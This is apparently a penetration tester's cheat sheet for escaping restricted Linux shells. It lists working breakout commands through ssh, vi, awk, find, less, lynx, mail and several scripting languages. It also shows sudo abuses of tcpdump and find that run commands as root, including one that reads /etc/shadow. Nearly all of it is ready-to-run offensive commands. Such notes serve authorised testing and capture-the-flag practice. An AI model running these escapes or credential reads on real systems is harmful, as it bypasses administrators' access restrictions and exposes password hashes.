# Escaping Restricted Linux Shells

## A good url to find binaries that is possible for privesc that may not be covered in this list.

```sh
https://gtfobins.github.io/
```

## Bybass rbash with ssh

ssh user@server -t "bash --noprofile"

## Use echo command with glob if ls is not present
## to list files have access to in the restricted shell

echo /usr/local/rbin/*

## Editors

:set shell=/bin/bash
:shell

:! /bin/bash

# Awk command

awk 'BEGIN {system("/bin/sh")}'

# Find command

find / -name blahblah -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;

# More, Less, and Man commands

'! /bin/sh'\
'!/bin/sh'\
'!bash'

# Less

sudo less /etc/file\
v\
:shell

# Write script with tee command

echo "evil script code" | tee script.sh

# Try invoking SHELL throught your favorite language

python: exit_code = os.system('/bin/sh') output = os.popen('/bin/sh').read()\
perl -e 'exec "/bin/sh";'\
perl: exec "/bin/sh";\
ruby: exec "/bin/sh"\
lua: os.execute('/bin/sh')\
irb(main:001:0> exec "/bin/sh"

# lynx

open a local file with lynx (e.g.: $ lynx /etc/passwd)\
type “o” to open the options; change the second option (Editor) to “/bin/vi” and save the changes to go back at the main page.\
Type “e” to edit the file with vi\
Do the vi escape

# Mail command

set VISUAL=/bin/vi\
$ mail -s "subject" "destination email"\
Type "~v" on the next line to edit the mail with vi.

# tcpdump

echo $'id\ncat /etc/shadow' > /tmp/.test\
chmod +x /tmp/.test\
sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root

# find
sudo find / -exec bash -i \;\
find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' ;

# rvim
```sh
python import pty;pty.spawn("/bin/bash")
```
